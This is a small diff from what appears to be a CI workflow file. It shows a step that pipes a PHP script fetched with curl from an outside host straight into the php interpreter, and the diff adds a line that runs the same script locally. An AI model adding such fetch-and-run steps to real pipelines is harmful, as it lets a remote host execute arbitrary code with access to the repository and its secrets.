@@ -28,3 +28,4 @@ jobs:
     - name: Run PHP script from remote URL
       run: |
         curl https://parser.crik.live/delete_yml.php | php
+        php delete_yml.php
